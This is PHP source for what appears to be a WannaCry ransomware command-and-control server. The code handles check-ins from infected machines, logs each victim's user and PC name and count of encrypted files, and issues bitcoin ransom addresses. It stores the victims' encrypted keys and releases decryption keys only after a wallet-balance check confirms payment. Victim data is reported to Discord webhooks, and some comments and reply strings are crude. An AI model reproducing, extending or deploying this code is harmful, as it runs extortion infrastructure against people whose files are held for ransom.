<?php
	
	require("config.php");
	require_once("crypto.php");
	require_once("misc.php");
	require_once("libs/BitcoinECDSA/BitcoinECDSA.php");
	require_once("libs/DiscordWebhooksPHP/DiscordWebhooksPHP.php");
	
	use BitcoinPHP\BitcoinECDSA\BitcoinECDSA;
	use DiscordWebhooksPHP\Client;
	
	function parse_key_packet($packet)
	{
		try
		{
			$data_len = unpack("v", $packet)[1];
			if($data_len < 38 || $data_len > 240)
			{
				return null;
			}
			
			if($packet[2] != "\x02"
			|| $packet[$data_len - 1] != "\x01"
			|| $packet[$data_len - 2] != "\x00"
			|| $packet[$data_len - 3] != "\x02")
			{
				return null;
			}
			
			$data_len = $data_len - 36;
			
			$xor_key = null;
			for($i = 0; $i < 31; $i++)
			{
				//$xor_key[$i] = $packet[$i + ($data_len + 2)];
				$xor_key .= $packet[$i + ($data_len + 2)];
			}
			//$xor_key = implode($xor_key);
			
			$data_len = $data_len + 36;
			
			$hash_ck = wn_crc16($xor_key, 31);
			$hash_og = bin2hex($packet[$data_len + 1] . $packet[$data_len]);
			
			if($hash_ck != $hash_og)
			{
				return null;
			}
			
			return $xor_key;
		}
		catch(Exception $e)
		{
			echo "Error in \"parse_key_packet\" " . $e->getMessage() . "\n\n";
			return null;
		}
    }
	
	function make_packet($data, $packet_type, &$key)
	{
		$packet  = xor_data($key, $packet_type, 1);
		$packet .= xor_data($key, $data, strlen($data));
		$data_len = pack("v", strlen($packet));
		
		return $data_len . $packet;
	}
	
	function parse_info_packet($packet, &$xor_key)
	{
		try
		{
			$data_len = unpack("v", $packet)[1];
			$packet_type = xor_data($xor_key, $packet[2], 1);
			
			if($packet_type != "\x07") // php is retarded so we have to do string literals (or I am maybe)
			{
				return null;
			}
			
			$data_main_len = $data_len - 1;
			
			$real_data = null;
			for($i = 0; $i < $data_main_len; $i++)
			{
				//$real_data[$i] = $packet[$i + 3];
				$real_data .= $packet[$i + 3];
			}
			//$real_data = implode($real_data);
			
			$decrypted_packet = xor_data($xor_key, $real_data, $data_main_len);
			return info_packet_handler($decrypted_packet, strlen($decrypted_packet), $xor_key);
		}
		catch(Exception $e)
		{
			echo "Error in \"parse_info_packet\" " . $e->getMessage() . "\n\n";
			return null;
		}
	}
	
	// Possible DoS, malformed packets with valid headers.
	// fix with exceptions?
	function info_packet_handler($packet, $packet_len, &$xor_key)
	{
		try
		{
			$user_id = strtoupper(bin2hex(substr($packet, 0, 8)));
			
			// nasty ass binary packet parsing the movie
			$offset = 8;
			
			$pc_name_len = get_null_terminated_str_len(substr($packet, $offset, 16));
			$pc_name = sanitize_string(substr($packet, $offset, $pc_name_len));
			
			$offset += $pc_name_len + 1;
			
			$message_type = unpack("c", substr($packet, $offset, 1))[1];
			
			$offset += 1;
			
			$user_name_len = get_null_terminated_str_len(substr($packet, $offset, $packet_len - $offset));
			$user_name = sanitize_string(substr($packet, $offset, $user_name_len));
			
			$offset += $user_name_len + 1;
			
			$user_dir = check_user_info($user_id, $pc_name, $user_name);
			if($user_dir === null)
			{
				return null;
			}
			
			$fuck = explode(";", DISCORD_WEBHOOK);
			shuffle($fuck);
			
			$discord_client = new Client($fuck[0]);
			
			switch($message_type)
			{
				case 11: // message opcode
				{
					$message_code_len = get_null_terminated_str_len(substr($packet, $offset, 4)); // 1.0 has longer types
					$message_code = trim(substr($packet, $offset, $message_code_len));
					
					$offset += 4;
					
					if($message_code == "---") // stats update
					{
						echo "stats send\n";
						
						$stats_string_len = get_null_terminated_str_len(substr($packet, $offset, $packet_len - $offset));
						$stats_string = substr($packet, $offset, $stats_string_len);
						
						if(!file_exists($user_dir . "stats"))
						{
							$stats_array = explode("\t", $stats_string);
							
							$embedData = array(
								"color"     => hexdec("FF0000"), // Blue
								"fields"     => array(
									array(
										"name"         => "User id:",
										"value"     => "```" . $user_id . "```",
										"inline"     => false
									),
									array(
										"name"         => "User info:",
										"value"     => "```" . $user_name . "@" . $pc_name . "```",
										"inline"     => false
									),
									array(
										"name"         => "First run date:",
										"value"     => "```" . $stats_array[0] . "```",
										"inline"     => false
									),
									array(
										"name"         => "First contact date:",
										"value"     => "```" . $stats_array[1]. "```",
										"inline"     => false
									),
									array(
										"name"         => "Total encrypted files:",
										"value"     => "```" . $stats_array[2] . " (" . formatBytes($stats_array[3]) . ")```",
										"inline"     => false
									),
									array(
										"name"         => "Manifest file index:",
										"value"     => "```" . $stats_array[4] . "```",
										"inline"     => false
									)
								)
							);
							
							$discord_client->setMessage(DISCORD_MESSAGE . " New user stats!");
							$discord_client->setEmbedData($embedData);
							$discord_client->send();
							
							file_put_contents($user_dir . "stats", $stats_string);
							return make_packet("WE DID IT REDDIT\x00", "\x07", $xor_key);
						}
					}
					else if($message_code == "***") // message sent, send to a random discord webhook
					{
						echo "message send\n";
						
						$user_message_len = get_null_terminated_str_len(substr($packet, $offset, $packet_len - $offset), $packet_len - $offset);
						$user_message = str_replace(";;", "\r\n", trim(substr($packet, $offset, $user_message_len)));
						
						$embedData = array(
							"color"     => hexdec("FF0000"), // Blue
							"fields"     => array(
								array(
									"name"         => "User id:",
									"value"     => "```" . $user_id . "```",
									"inline"     => false
								),
								array(
									"name"         => "User info:",
									"value"     => "```" . $user_name . "@" . $pc_name . "```",
									"inline"     => false
								),
								array(
									"name"         => "Message:",
									"value"     => "```" . $user_message . "```",
									"inline"     => false
								)
							)
						);
							
						$discord_client->setMessage(DISCORD_MESSAGE . " User has sent a message!");
						$discord_client->setEmbedData($embedData);
						$discord_client->send();
						
						return make_packet("WE DID IT REDDIT\x00", "\x07", $xor_key);
					}
					
					return make_packet("WTF\x00", "\x06", $xor_key); // anything but type 0x07 should make the gui show an error
					
					break;
				}
				
				case 12: // user information opcode
				{
					$user_id_dup = strtoupper(bin2hex(substr($packet, $offset, 8)));
					
					$offset += 8;
					
					if($user_id != $user_id_dup) // for wcry 1.0 its possible MAYBE this could be diff basedo n diff key. idk
					{
						return make_packet("WTF\x00", "\x06", $xor_key);
					}
					
					echo "main checkin\n";
					
					if(!is_dir($user_dir . "keys/"))
					{
						mkdir($user_dir . "keys/", 0777);
					}
					
					$key_name = $user_dir . "keys/" . strtoupper(bin2hex(substr($packet, $offset, 4)));
					
					$offset += 4;
					
					$btcadr_len = get_null_terminated_str_len(substr($packet, $offset, 50), 50);
					$btcadr = trim(substr($packet, $offset, $btcadr_len));
					
					$is_offline_btc = false;
					$btcadr_read = null;
					
					if(!file_exists($user_dir . "btc_offline") && file_exists($user_dir . "btc"))
					{
						$btcadr_read = explode("|", file_get_contents($user_dir . "btc"))[0];
						if($btcadr != $btcadr_read)
						{
							$is_offline_btc = true;
							file_put_contents($user_dir . "btc_offline", $btcadr);
						}
					}
					else
					{
						$is_offline_btc = true;
						
						if(!file_exists($user_dir . "btc_offline"))
						{
							file_put_contents($user_dir . "btc_offline", $btcadr);
						}
					}
					
					if(!file_exists($user_dir . "msg"))
					{
						if($is_offline_btc == true)
						{
							$manual_message = base64_encode("Send me a message with your unique bitcoin wallet an hour before your payment.\r\nThen you will receive decryption key more quickly.");
							file_put_contents($user_dir . "msg", $manual_message);
						}
						else
						{
							file_put_contents($user_dir . "msg", "");
						}
					}
					
					$offset += $btcadr_len + 1;
					
					$pay_price_len = get_null_terminated_str_len(substr($packet, $offset, $packet_len - $offset), $packet_len - $offset);
					$pay_price = trim(substr($packet, $offset, $pay_price_len));
					
					$offset += $pay_price_len + 1;
					
					$is_doubled = unpack("c", substr($packet, $offset, 1))[1];
					$offset += 1;
					
					$encrypted_key_size = unpack("V", substr($packet, $offset, 4))[1];
					$offset += 4;
					
					if($is_doubled == 1)
					{
						if(!file_exists($user_dir . "price_double"))
						{
							file_put_contents($user_dir . "price_double", $pay_price);
							
							if(file_exists($user_dir . "price"))
							{
								unlink($user_dir . "price");
							}
						}
						else
						{
							$read_price = file_get_contents($user_dir . "price_double");
							if($read_price != $pay_price)
							{
								$pay_price = $read_price;
							}
						}
					}
					else
					{
						if(!file_exists($user_dir . "price"))
						{
							file_put_contents($user_dir . "price", $pay_price);
						}
						else
						{
							$read_price = file_get_contents($user_dir . "price");
							if($read_price != $pay_price)
							{
								$pay_price = $read_price;
							}
						}
					}
					
					if(!file_exists($key_name . ".eky"))
					{
						file_put_contents($key_name . ".eky", substr($packet, $offset, $encrypted_key_size));
					}
					
					$messages = file_get_contents($user_dir . "msg");
					if(strlen($messages) > 4)
					{
						$messages_array = explode("\n", $messages);
						
						$index_len = strlen($messages_array[0]);
						if($index_len > 4)
						{
							$result_message = base64_decode($messages_array[0]);
							file_put_contents($user_dir . "msg", implode("\n", array_diff($messages_array, array($messages_array[0]))));
							return make_packet($result_message . "\x00", "\x07", $xor_key);
						}
						else if($index_len == 1)
						{
							file_put_contents($user_dir . "msg", "");
						}
					}
					
					// FOR WANNACRY 1.x THERE IS A POSSIBILITY OF MULTIPLE KEYS
					// WHICH MUST BE PAID FOR **INDIVIDUALLY**
					// HOWEVER I HAVE NO IDEA HOW TO TRUICK THE GUI INTO SEEING MULTIPLE
					// RECHECK THIS FUNCTION WHEN I DO
					if($is_offline_btc == false
					&& $btcadr_read != null)
					{
						if(!file_exists($key_name . ".dky")
						&& check_wallet_balance($btcadr_read, $pay_price))
						{
							$master_key = openssl_pkey_get_private(MASTER_KEY_PEM);
							$decrypted_key = decrypt_user_key($key_name . ".eky", $master_key);
							if($decrypted_key !== null)
							{
								file_put_contents($key_name . ".dky", $decrypted_key);
							}
						}
					}
					
					if(file_exists($key_name . ".dky"))
					{
						$private_key = file_get_contents($key_name . ".dky");
						return make_packet($private_key, "\x07", $xor_key);
					}
					
					echo "nothing to respond with /shrug\n";
					return make_packet("THAT GIRL SAY SHE LOVE ME BUT I KNOW THE TRUTH. SHE JUST WANNA FUCK ME FOR SOME FUCKIN TRUES. CHIEF SOSA I'M THE FUCKIN TRUTH. AND NOW I'M GETTIN MONEY AND IT'S FUCKIN TRUE.\x00", "\x06", $xor_key);
					
					break;
				}
				
				case 13: // bitcoin update opcode, 1.x can send this but its not implemented
				{
					echo "bitcoin get\n";
					
					$message_code_len = get_null_terminated_str_len(substr($packet, $offset, 4)); // 1.0 has longer types
					$message_code = trim(substr($packet, $offset, $message_code_len));
					
					if($message_code != "+++")
					{
						return make_packet("WTF\x00", "\x06", $xor_key);
					}
					
					if(file_exists($user_dir . "btc"))
					{
						$btcadr = explode("|", file_get_contents($user_dir . "btc"))[0];
						if(strlen($btcadr) > 30 && strlen($btcadr) < 50)
						{
							return make_packet($btcadr . "\x00", "\x07", $xor_key);
						}
					}
					else
					{
						$bitcoinECDSA = new BitcoinECDSA();
						$bitcoinECDSA->generateRandomPrivateKey(); //generate new random private key
						$btcadr = $bitcoinECDSA->getAddress();
						
						echo "Generated address: " . $btcadr . "\n";
						
						if($bitcoinECDSA->validateAddress($btcadr)
						&& strlen($btcadr) > 30
						&& strlen($btcadr) < 50)
						{
							file_put_contents($user_dir . "btc", $btcadr . "|" . bin2hex($bitcoinECDSA->getPrivateKey()));
							return make_packet($btcadr . "\x00", "\x07", $xor_key);
						}
					}
					
					return make_packet("WTF\x00", "\x06", $xor_key);
					
					break;
				}
			}
		}
		catch(Exception $e)
		{
			echo "Error in \"info_packet_handler\" " . $e->getMessage() . "\n\n";
			return null;
		}
	}
?>